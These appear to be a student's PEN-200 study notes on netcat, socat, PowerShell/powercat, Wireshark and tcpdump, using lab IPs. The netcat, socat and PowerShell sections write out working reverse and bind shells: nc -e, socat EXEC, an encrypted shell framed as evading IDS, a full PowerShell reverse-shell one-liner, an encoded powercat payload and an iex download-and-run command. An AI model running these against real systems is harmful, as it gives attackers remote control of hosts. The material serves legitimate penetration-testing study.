---
id: kali.md
tags: [offsec, kali, pen-200]
created: 2023-01-13 11:56
---
# PEN-200: 4 practical tools

backlinks:
- [[offsec/pen200/4/lab]]

sources:

---

## netcat


### client mode - aka connect
in client mode we can connect to any tcp/udp port which allows us to
    - check if a port is open or closed
    - read a banner from service listening on the port
    - connect to a network service manually

- flags
  - -n to skip dns name resolution
  - -v for verbosity


```shell
# connect to port 110 (pop3 mail server) on 10.11.0.22 skipping dns name resolution and be verbose
nc -nv 10.11.0.22 110
(UNKNOWN) [10.11.0.22] 110 (pop3) open
+OK POP3 server lab ready <00004.1546827@lab>
USER offsec
+OK offsec welcome here
PASS offsec
-ERR unable to lock mailbox
quit
+OK POP3 server lab signing off.

````

### server mode - aka listen

we can also listen on a port for any connections

***DO NOT ADD THE IP ADDRESS WHEN LISTENING***

```shell
# SERVER listen on port 9000 with verbose, no dns lookup
nc -nlvp 9000

# CLIENT from other machine 
nc -nv 192.168.126.128 9000

```

### transfering files 

send a file from our kali machine to a windows machine (there is no feedback on progress, success or failure - if it is small we can try running exe with --help)

```shell
# WINDOWS setup a listener on A on port 9000 that redirects any output to incoming.exe
nc -nlvp 9000 > incoming.exe
listening on [any] 9000 ...


# KALI we push the wget.exe file 
locate wget.exe
/usr/share/windows-resources/binaries/wget.exe

nc -nv 10.11.0.22 9000 < /usr/share/windows-resources/binaries/wget.exe

```


### remote administration aka -DGAPING_SECURITY_HOLE

The netcat-traditional version of Netcat (compiled with the "-DGAPING_SECURITY_HOLE" flag) enables the -e option, which executes a program after making or receiving a successful connection. This powerful feature opened up all sorts of interesting possibilities from a security perspective and is therefore not available in most modern Linux/BSD systems. However, due to the fact that Kali Linux is a penetration testing distribution, the Netcat version included in Kali supports the -e option.

When enabled, this option can redirect the input, output, and error messages of an executable to a TCP/UDP port rather than the default console.

For example, consider the cmd.exe executable. By redirecting stdin, stdout, and stderr to the network, we can bind cmd.exe to a local port. Anyone connecting to this port will be presented with a command prompt on the target computer.


#### scenario one - bind shell
WindowsBob needs LinuxAlice to connect to her computer and run some commands remotely. 
WindowsBob has a public ip address but LinuxAlice is behind a corporate firewall and does not have a public ip address.
WindowsBob will run a netcat listener on port 9000 and redirect to cmd.exe using the -e flag
![Alt text](kb/offsec/pen200/04-PracticalTools/image.png)
```shell
# WindowsBob sets up a listener on port 9000 and redirects to cmd.exe
nc -nlvp 9000 -e cmd.exe
```

Anyone can now connect to WindowsBob machine on port 9000 and get a cmd prompt

```shell
# LinuxAlice connects to WindowsBob
nc -nv 10.11.0.22 4444
# LinuxAlice has shell

(UNKNOWN) [10.11.0.22] 4444 (?) open
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\WindowsBob> ipconfig
```


#### scenario two - reverse shell

LinuxAlice now needs help from WindowsBob and needs him to connect to her computer and run some commands remotely.
WindowsBob has a public ip address but LinuxAlice is behind a corporate firewall and does not have a public ip address.

How does WindowsBob connect to LinuxAlice's machine?

LinuxAlice cannot send an ip address for WindowsBob to connect too, but she can send control of her bash prompt to WindowsBob

![Alt text](kb/offsec/pen200/04-PracticalTools/image-1.png)

```shell
#WindowsBob sets up a nc listener on port 9000
nc -nvlp 9000
listening on [any] 4444 ...
```

LinuxAlice can now send a reverse shell to WindowsBob

```shell
#LinuxAlice sends reverse shell to WindowBobs ip address
nc -nv 10.11.0.22 9000 -e /bin/bash
(UNKNOWN) [10.11.0.22] 4444 (?) open
```

On WindowsBob listening machine, he gets a connect

```shell

#WindowsBob has root
nc -nvlp 9000
listening on [any] 4444 ...

whoami
LinuxAlice
```


## socat

```shell
# connect to a remote server on port 80
socat - TCP4:192.168.1.2:80

# listen on port 443 (needs to run elevated because its below 1024)
sudo socat TCP4-LISTEN:443 STDOUT


```

### transfer files

LinuxAlice needs to sent WindowsBob a secret_passwords.txt file.

```shell
# from LinuxAlices side we will share the file on port 443
sudo socat TCP4-LISTEN:443,fork file:secret_password.txt

# from WindowBobs side we connect to LinuxAlice and retrieve the file
socat TCP4:10.11.0.4:443
file:received_secret_password.txt

dir
received_secret_password.txt

```

### reverse shells

LinuxAlice now needs help from WindowsBob and needs him to connect to her computer and run some commands remotely.
WindowsBob has a public ip address but LinuxAlice is behind a corporate firewall and does not have a public ip address.

How does WindowsBob connect to LinuxAlice's machine?

LinuxAlice cannot send an ip address for WindowsBob to connect too, but she can send control of her bash prompt to WindowsBob

```shell
# WindowsBob first creates a listener on port 443
# -d -d adds verbosity
socat -d -d TCP4-LISTEN:443 STDOUT

# LinuxAlice uses socats exec option which will execute the given program once a remote connection is made
socat TCP4:10.10.11.04:443 EXEC:/bin/bash

# WindowsBob has shell

... socat[4388] N accepting connection from AF=2 10.11.0.4:54720 on 10.11.0.22:443
... socat[4388] N using stdout for reading and writing
... socat[4388] N starting data transfer loop with FDs [4,4] and [1,1]
whoami
kali
id
uid=1000(kali) gid=1000(kali) groups=1000(kali)

```

### encrypted bind shells

To add encryption to a bind shell, we will rely on Secure Socket Layer1 certificates. This level of encryption will assist in evading intrusion detection systems (IDS)2 and will help hide the sensitive data we are transceiving.

To continue with the example of Alice and Bob, we will use the openssl application to create a self-signed certificate using the following options:

  req: initiate a new certificate signing request
  -newkey: generate a new private key
  rsa:2048: use RSA encryption with a 2,048-bit key length.
  -nodes: store the private key without passphrase protection
  -keyout: save the key to a file
  -x509: output a self-signed certificate instead of a certificate request
  -days: set validity period in days
  -out: save the certificate to a file

Once we generate the key, we will cat the certificate and its private key into a file, which we will eventually use to encrypt our bind shell.

```shell

openssl req -newkey rsa:2048 -nodes -keyout bind_shell.key -x509 -days 362 -out bind_shell.crt


........+.......+..+.+.....+.......+..+......+.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.....+..+...+...+......+.+..............+.............+..+.+............+..+...+.............+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*.+.....................+.......................+....+......+..+...............+.......+..+...+.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
.+.+..............+....+...+..+.......+...+..+.+.....+...+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*........+...+.......+.....+......+....+......+..+....+.....+.+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*....+......+.+.........+...+...+..+......+......+.........+....+............+...+....................+...+.......+...+.........+.....+.+...+.....+.+..................+..+.+...+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
-----
You are about to be asked to enter information that will be incorporated
into your certificate request.
What you are about to enter is what is called a Distinguished Name or a DN.
There are quite a few fields but you can leave some blank
For some fields there will be a default value,
If you enter '.', the field will be left blank.
-----
Country Name (2 letter code) [AU]:AU
State or Province Name (full name) [Some-State]:
Locality Name (eg, city) []:
Organization Name (eg, company) [Internet Widgits Pty Ltd]:
Organizational Unit Name (eg, section) []:
Common Name (e.g. server FQDN or YOUR name) []:
Email Address []:

# combine the files to become a pem
cat bind_shell.key bind_shell.crt > bind_shell.pem

#LinuxAlice then uses this bind_shell.pem to encrypt traffic

sudo socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash

# WindowsBob then connects using openssl (instead of tcp4) and disables ssl certification verification via verify=0
# WindowsBob has shell

socat - OPENSSL:10.11.0.4:443,verify=0



```

## Powershell and Powercat

The powershell execution policy by default is set to Restricted which means the system will neither load nor run powershell scripts.

```powershell
# set powershell execution to unrestricted
Set-ExecutionPolicy Unrestricted

```

transfer a file from WindowsBob to LinuxAlice
```powershell

# -c executes the command inside the dbl quotes
# new-object System.Net.WebClient - create new webclient
# download the file from http to c:

powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.0.4/wget.exe','C:\Users\offsec\Desktop\wget.exe')"

```

### reverse shell

LinuxAlice sets up a listener on her device

```shell
sudo nc -nlvp 443

```

```powershell
# the actual raw code of a reverse shell

#First, we see a client variable, which is assigned the target IP address, a stream variable, a byte array called bytes, and a while loop followed by a call to close the client connection. Within the while loop, we can see several lines responsible for reading and writing data to the network stream. Note that the iex2 ("Invoke-Expression") cmdlet is a key part of this code chunk as it runs any string it receives as a command and the results of the command are then redirected and sent back via the data stream.

$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush();
}
$client.Close();

```

### reverse shell

WindowsBob executes the below powershell

```powershell
powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

```

LinuxAlice now has shell

```shell

sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63515

PS C:\Users\offsec>

```

### bind shell

On WindowsBob's device we run this powershell

```powershell
powershell -c "$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',443);$listener.start();$client = $listener.AcceptTcpClient();$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close();$listener.Stop()"
```

LinuxAlice binds via netcat, has shell

```shell
nc -nv 10.11.0.22 443

(UNKNOWN) [10.11.0.22] 443 (https) open
ipconfig
Windows IP Configuration
Ethernet adapter Local Area Connection:
   Connection-specific DNS Suffix  . :
   IPv4 Address. . . . . . . . . . . : 10.11.0.22
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 10.11.0.1

C:\Users\offsec>

```

## powercat

Powercat is essentially the PowerShell version of Netcat written by besimorhino
https://github.com/besimorhino/powercat/blob/master/powercat.ps1

to install on Linux 

```shell
sudo apt install powercat
```

To install on Windows

```powershell
# run from the web 

iex (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')

# or run locally
curl -o powercat.ps1 https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1
. .\powercat.ps1

```

```powershell

#Examples:

# Listen on port 8000 and print the output to the console.
powercat -l -p 8000

# Connect to 10.1.1.1 port 443, send a shell, and enable verbosity.
powercat -c 10.1.1.1 -p 443 -e cmd -v

# Connect to the dnscat2 server on c2.example.com, and send dns queries to the dns server on 10.1.1.1 port 53.
powercat -c 10.1.1.1 -p 53 -dns c2.example.com

# Send a file to 10.1.1.15 port 8000.
powercat -c 10.1.1.15 -p 8000 -i C:\inputfile

# Write the data sent to the local listener on port 4444 to C:\outfile
powercat -l -p 4444 -of C:\outfile

# Listen on port 8000 and repeatedly server a powershell shell.
powercat -l -p 8000 -ep -rep

# Relay traffic coming in on port 8000 over tcp to port 9000 on 10.1.1.1 over tcp.
powercat -l -p 8000 -r tcp:10.1.1.1:9000

# Relay traffic coming in on port 8000 over tcp to the dnscat2 server on c2.example.com, sending queries to 10.1.1.1 port 53.
powercat -l -p 8000 -r dns:10.1.1.1:53:c2.example.com

```

### transfer files from WindowsBob to LinuxAlice 

```shell
#LinuxAlice sets up listener 
sudo nc -nlvp 443 > receiving_file.txt

```

```powershell
# WindowsBob invokes powercat to send the file
powercat -c 10.11.0.4 -p 443 -i c:\users\sending_file.txt

```

```shell
#LinuxAlice checks for file
ls receiveing_file.txt
receiving_file.txt

```

### reverse shell from WindowsBob to LinuxAlice

```shell
# LinuxAlice sets up listener
sudo nc -nlvp 443
listening on [any] 443 ...
```

```powershell
# WindowsBob invokes powercat
powercat 10.11.0.4 -p 443 -e cmd.exe
```

LinuxAlice has shell

```shell

connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63699
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec>


```
### bind shell from LinuxAlice to WindowsBob

```powershell
# WindowsBob invokes powercat as a listener
powercat -l -p 443 -e cmd.exe
```

LinuxAlice connects and has shell

```shell
nc 10.11.0.22 443
Microsoft Windows [Version 10.0.17134.590]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\offsec>
```

### powercat generate payloads

Powercat can also generate stand-alone payloads. In the context of powercat, a payload is a set of powershell instructions as well as the portion of the powercat script itself that only includes the features requested by the user. Let's experiment with payloads in this next example.

After starting a listener on Alice's machine, we create a stand-alone reverse shell payload by adding the -g option to the previous powercat command and redirecting the output to a file. This will produce a powershell script that Bob can execute on his machine.

```shell
# LinuxAlice sets up listener
sudo nc -nlvp 443
listening on [any] 443 ...
```

#### NEW CHARACTER - WINDOWSALICE 

WindowsAlice is Alice using a test windows box with powercat in c:\tools\practicaltools

```powershell
# WindowsAlice creates a powershell payload from powercat

powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1

-a----        1/13/2020   5:16 AM          37641 powercat.ps1
-a----        1/21/2023   8:47 PM          17416 reverseshell.ps1

```

This payload can easily be detected by IDS because it is big, contains hardcoded strings which are easily identifiable

#### create a standalone encoded payload using -ge

```powershell
# WindowsAlice creates a powershell payload from powercat

powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1

# WindowsBob now needs to execute this command
powershell.exe -E ZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAHIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAsACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYgBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAAIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgACAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBlAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA

```

LinuxAlice has shell

```shell

kali@kali:~$ sudo nc -lnvp 443
listening on [any] 443 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 43725

PS C:\Users\offsec>

```

## wireshark

The capture filters during a Wireshark session, any packets that do not match the filter criteria will be dropped and the remaining data is passed on to the capture engine
The capture engine then dissects the incoming packets, analyzes them, and finally applies any additional display filters before displaying the output.

![Alt text](kb/offsec/pen200/04-PracticalTools/image-2.png)

```shell
# launch wireshark and send to back
sudo wireshark &

```
### capture filters

we can use capture filters to reduce the amount of captured traffic by discarding any traffic that does not match our filter and narrow our focus to the packets we wish to analyze. Be aware that any traffic excluded from a capture filter will be lost, so it is best to define broad capture filters if you are concerned about potentially losing data.

type in a capture filter like below or choose one from the menu Capture -> Capture Filters

```
net 10.11.1.0/24
```
![Alt text](kb/offsec/pen200/04-PracticalTools/image-3.png)

![Alt text](assets/attachments/kb/offsec/pen200/04-PracticalTools/notes/image-4.png)

### display filters


Wireshark Filter by IP          ip.addr == 10.10.50.1

Filter by Destination IP        ip.dest == 10.10.50.1

Filter by Source IP             ip.src == 10.10.50.1

Filter by IP range              ip.addr >= 10.10.50.1 and ip.addr <= 10.10.50.100

Filter by Multiple Ips          ip.addr == 10.10.50.1 and ip.addr == 10.10.50.100

Filter out/ Exclude IP address  !(ip.addr == 10.10.50.1)

Filter IP subnet                ip.addr == 10.10.50.1/24

Filter by multiple specified IP subnets   ip.addr == 10.10.50.1/24 and ip.addr == 10.10.51.1/24

Filter by Protocol 
    dns
    http
    ftp
    ssh
    arp
    telnet
    icmp

Filter by port (TCP)              tcp.port == 25

Filter by destination port (TCP)  tcp.dstport == 23

Filter by ip address and port     ip.addr == 10.10.50.1 and Tcp.port == 25

Filter by URL                     http.host == “host name”

Filter by time stamp              frame.time >= “June 02, 2019 18:04:00”

Filter SYN flag                   tcp.flags.syn == 1

                                  tcp.flags.syn == 1 and tcp.flags.ack == 0

Wireshark Beacon Filter           wlan.fc.type_subtype = 0x08

Wireshark broadcast filter        eth.dst == ff:ff:ff:ff:ff:ff

WiresharkMulticast filter         (eth.dst[0] & 1)

Host name filter                  ip.host = hostname

MAC address filter                eth.addr == 00:70:f4:23:18:c4

RST flag filter                   tcp.flags.reset == 1

![Alt text](assets/attachments/kb/offsec/pen200/04-PracticalTools/notes/image-5.png)

## tcpdump

Tcpdump is a text-based network sniffer that is streamlined, powerful, and flexible despite the lack of a graphical interface. It is by far the most commonly-used command-line packet analyzer and can be found on most Unix and Linux operating systems, but local user permissions determine the ability to capture network traffic.

Tcpdump can both capture traffic from the network and read existing capture files. 

```shell
# read an existing pcap 
sudo tcpdump -r password_cracking_filtered.pcap
```

we can filter a pcap using awk. First, we will use the -n option to skip DNS name lookups and -r to read from our packet capture file. Then, we can pipe the output into awk, printing the destination IP address and port (the third space-separated field) and pipe it again to sort and uniq -c to sort and count the number of times the field appears in the capture, respectively. Lastly we use head to only display the first 10 lines of the output:

```shell
sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F" " '{print $5}' | sort | uniq -c | head
```

We can see that 172.16.40.10 was the most common destination address followed by 208.68.234.99. Given that 172.16.40.10 was contacted on a low destination port (81) and 208.68.234.99 was contacted on high destination ports, we can rightly assume that the former is a server and the latter is a client.

We could also safely assume that the client address made many requests against the server, but in order to proceed without too many assumptions, we can use filters to inspect the traffic more closely.

In order to filter from the command line, we will use the source host (src host) and destination host (dst host) filters to output only source and destination traffic respectively. We can also filter by port number (-n port 81) to show both source and destination traffic against port 81. Let's try those filters now:

```shell

sudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap
...
08:51:20.801051 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389, ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,wscale 4], length 0
08:51:20.802053 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [.], ack 89, win 905, options [nop,nop,TS val 71430591 ecr 25538253], length 0
...
sudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap
...
08:51:20.801048 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074, win 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0
08:51:20.802026 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [.], ack 4166855390, win 115, options [nop,nop,TS val 25538253 ecr 71430591], length 0
...
sudo tcpdump -n port 81 -r password_cracking_filtered.pcap
...
08:51:20.800917 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074, win 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0
08:51:20.800953 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389, ack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr 25538253,nop,wscale 4], length 0
...


```

We could continue to process this filtered output with various command-line utilities like awk and grep, but let's move along and actually inspect some packets in more detail to see what kind of details we can uncover.

To dump the captured traffic, we will use the -X option to print the packet data in both HEX and ASCII1 format:

```shell

kali@kali:~$ sudo tcpdump -nX -r password_cracking_filtered.pcap
...
08:51:25.043062 IP 208.68.234.99.33313 > 172.16.40.10.81: Flags [P.], seq 1:140, ack 1
  0x0000:  4500 00bf 158c 4000 3906 9cea d044 ea63  E.....@.9....D.c
  0x0010:  ac10 280a 8221 0051 a726 a77c 6fd8 ee8a  ..(..!.Q.&.|o...
  0x0020:  8018 0073 1c76 0000 0101 080a 0185 b2f2  ...s.v..........
  0x0030:  0441 f5e3 4745 5420 2f2f 6164 6d69 6e20  .A..GET.//admin.
  0x0040:  4854 5450 2f31 2e31 0d0a 486f 7374 3a20  HTTP/1.1..Host:.
  0x0050:  6164 6d69 6e2e 6d65 6761 636f 7270 6f6e  admin.megacorpon
  0x0060:  652e 636f 6d3a 3831 0d0a 5573 6572 2d41  e.com:81..User-A
  0x0070:  6765 6e74 3a20 5465 6820 466f 7265 7374  gent:.Teh.Forest
  0x0080:  204c 6f62 7374 6572 0d0a 4175 7468 6f72  .Lobster..Author
  0x0090:  697a 6174 696f 6e3a 2042 6173 6963 2059  ization:.Basic.Y
  0x00a0:  5752 7461 5734 3662 6d46 7562 3352 6c59  WRtaW46bmFub3RlY
  0x00b0:  3268 7562 3278 765a 336b 780d 0a0d 0a    2hub2xvZ3kx....
...


```

We immediately notice that the traffic to 172.16.40.10 on port 81 looks like HTTP data. In fact, it seems like these HTTP requests contain Basic HTTP Authentication data, with the User agent "Teh Forest Lobster". This is a pretty clear sign that something strange is occurring.

In order to uncover the rest of the mystery, we will need to rely on advanced header filtering.

